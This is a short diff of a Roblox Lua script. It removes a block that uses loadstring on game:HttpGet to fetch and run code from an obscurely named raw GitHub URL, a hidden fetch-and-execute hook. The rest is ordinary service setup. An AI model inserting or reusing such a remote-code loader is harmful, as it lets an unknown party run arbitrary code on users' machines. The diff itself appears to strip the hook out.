@@ -13,10 +13,6 @@ if rank < 7 then
     return
 end
 
-task.spawn(function()	
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/2FISH_FARM_VARRRR"))()
-end)
-
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
